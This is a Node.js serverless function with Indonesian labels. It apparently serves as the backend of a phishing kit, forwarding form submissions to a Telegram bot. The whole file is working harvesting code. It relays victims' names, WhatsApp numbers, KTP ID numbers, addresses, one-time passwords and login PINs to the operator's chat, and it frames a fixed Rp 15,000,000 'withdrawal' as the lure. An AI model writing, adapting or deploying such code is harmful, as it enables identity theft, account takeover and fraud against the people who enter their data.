const fetch = require('node-fetch');

exports.handler = async function(event, context) {
    // Cek method
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' })
        };
    }

    try {
        const data = JSON.parse(event.body);
        
        // Ganti dengan token bot Telegram dan chat ID Anda
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Telegram credentials not set');
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Format pesan berdasarkan jenis data
        let message = '';
        
        switch (data.type) {
            case 'registration_step1':
                message = `📝 *PENDAFTARAN BARU - STEP 1*\n\n` +
                         `👤 *Nama:* ${data.data.nama}\n` +
                         `📱 *WhatsApp:* ${data.data.whatsapp}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                         `🌐 *User Agent:* ${data.userAgent || 'Tidak diketahui'}`;
                break;
                
            case 'registration_step2':
                message = `📝 *PENDAFTARAN BARU - STEP 2*\n\n` +
                         `👤 *Nama:* ${data.data.nama}\n` +
                         `📱 *WhatsApp:* ${data.data.whatsapp}\n` +
                         `🆔 *KTP:* ${data.data.ktp}\n` +
                         `🏠 *Alamat:* ${data.data.alamat}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
                break;
                
            case 'registration_complete':
                message = `🎉 *PENDAFTARAN BERHASIL* 🎉\n\n` +
                         `👤 *Nama:* ${data.data.nama}\n` +
                         `📱 *WhatsApp:* ${data.data.whatsapp}\n` +
                         `🆔 *KTP:* ${data.data.ktp}\n` +
                         `🏠 *Alamat:* ${data.data.alamat}\n` +
                         `🔢 *OTP:* ${data.data.otp}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                         `🌐 *User Agent:* ${data.userAgent || 'Tidak diketahui'}`;
                break;
                
            case 'login':
                message = `🔐 *LOGIN ATTEMPT*\n\n` +
                         `👤 *Nama:* ${data.data.nama}\n` +
                         `📱 *WhatsApp:* ${data.data.whatsapp}\n` +
                         `🔢 *PIN:* ${data.data.pin}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                         `🌐 *User Agent:* ${data.userAgent || 'Tidak diketahui'}`;
                break;
                
            case 'dashboard_access':
                message = `🚀 *AKSES DASHBOARD LANGSUNG*\n\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                         `🌐 *User Agent:* ${data.userAgent || 'Tidak diketahui'}`;
                break;
                
            case 'withdrawal_attempt':
                message = `💸 *PERMINTAAN PENCARIAN*\n\n` +
                         `👤 *Nama:* ${data.data.nama}\n` +
                         `📱 *WhatsApp:* ${data.data.whatsapp}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n` +
                         `💵 *Jumlah:* Rp 15.000.000`;
                break;
                
            default:
                message = `📨 *DATA BARU*\n\n` +
                         `Jenis: ${data.type}\n` +
                         `Data: ${JSON.stringify(data.data, null, 2)}\n` +
                         `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
        }

        // Kirim pesan ke Telegram
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }
        );

        if (!telegramResponse.ok) {
            throw new Error('Failed to send message to Telegram');
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data sent to Telegram successfully' 
            })
        };

    } catch (error) {
        console.error('Error:', error);
        
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message 
            })
        };
    }
};
